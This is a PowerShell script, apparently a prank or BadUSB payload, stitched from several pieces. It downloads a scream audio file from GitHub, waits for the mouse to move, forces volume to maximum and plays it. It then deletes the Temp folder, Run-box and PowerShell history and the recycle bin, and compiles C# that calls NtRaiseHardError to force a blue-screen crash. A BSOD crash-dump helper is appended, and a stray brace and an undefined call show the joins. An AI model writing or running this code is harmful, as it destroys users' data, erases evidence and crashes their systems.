# Download WAV file; replace link to $wav to add your own sound

$wav = "https://github.com/MajorMarmalade/Sounds/blob/main/hjkhjkhkhjkh-scream-(earrape)-By-Tuna.wav?raw=true"

$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

# Import the System.Windows.Forms assembly
Add-Type -AssemblyName System.Windows.Forms

# Store the original position of the cursor
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Loop until the cursor position changes
while (1) {
    # Check if the cursor position has changed
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        # If the cursor has moved, exit the loop
        break
    }
}

# At this point, the script will continue executing

function Play-WAV{
$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
}

# This turns the volume up to max level
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

#plays audio file

Pause-Script
Play-WAV

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@
    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
    [CS]::Kill()
}

function Get-DumpSettings {
<#
.SYNOPSIS

Gets the crash dump settings
Author:  Barrett Adams (@peewpw)

.DESCRIPTION

Queries the registry for crash dump settings so that you'll have some idea
what type of dump you're going to generate, and where it will be.

.EXAMPLE

PS>Import-Module .\Invoke-BSOD.ps1
PS>Invoke-BSOD
   (Blue Screen Incoming...)

#>
	$regdata = Get-ItemProperty -path HKLM:\System\CurrentControlSet\Control\CrashControl

	$dumpsettings = @{}
	$dumpsettings.CrashDumpMode = switch ($regdata.CrashDumpEnabled) {
		1 { if ($regdata.FilterPages) { "Active Memory Dump" } else { "Complete Memory Dump" } }
		2 {"Kernel Memory Dump"}
		3 {"Small Memory Dump"}
		7 {"Automatic Memory Dump"}
		default {"Unknown"}
	}
	$dumpsettings.DumpFileLocation = $regdata.DumpFile
	[bool]$dumpsettings.AutoReboot = $regdata.AutoReboot
	[bool]$dumpsettings.OverwritePrevious = $regdata.Overwrite
	[bool]$dumpsettings.AutoDeleteWhenLowSpace = -not $regdata.AlwaysKeepMemoryDump
	[bool]$dumpsettings.SystemLogEvent = $regdata.LogEvent
	$dumpsettings
}


